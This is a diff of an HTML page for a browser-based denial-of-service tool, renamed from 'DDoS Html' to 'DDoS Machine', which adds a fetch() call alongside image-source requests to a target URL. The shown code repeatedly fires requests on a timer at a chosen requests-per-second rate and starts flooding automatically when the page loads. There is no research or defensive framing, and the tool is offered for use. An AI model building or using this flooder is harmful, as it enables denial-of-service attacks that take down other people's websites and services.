@@ -1,13 +1,13 @@
     <html>
     <head>  
-        <title>DDoS Html</title>
+        <title>DDoS Machine</title>
 
 		<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
     </head>
-    <center><font size="6" color="red"><blink> DDoS HtmL </blink> </font></center><br>
-    <center><font size="3" color="red"><blink> Author : Rahat Khan Tusar(RKT) </blink> </font></center>
+    <center><font size="6" color="red"><blink> DDoS Machine </blink> </font></center><br>
+    <center><font size="3" color="red"><blink> Remade of DDoS Html </blink> </font></center>
     <br>
-    <center><font size="3" color="red"><blink> Github : https://github.com/r3k4t</blink> </font></center><br>
+    <center><font size="3" color="red"><blink> Added Fetch Method </blink> </font></center><br>
     <body style="background-color:black; color:#ffffff;">
     <div style="position:absolute; width:100%; height:100%;">
     <div style="width:490px; height:326px; position:absolute;">
@@ -84,6 +84,7 @@
  
                         fetch(targetURL);
                         img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                       
                         requestsHT[rID] = img;
                         onRequest(rID);
                     };
@@ -119,7 +120,7 @@
                         this.innerHTML = "START";
                     } else {
                         isFiring = true;
-                        this.innerHTML = "Stop flooding";
+                        this.innerHTML = "STOP";
  
                         fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
                     }
@@ -128,7 +129,7 @@
             })();
  
     isFiring = true;
-    document.getElementById("fireButton").innerHTML = "Start";
+    document.getElementById("fireButton").innerHTML = "START";
     fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
         </script>
   
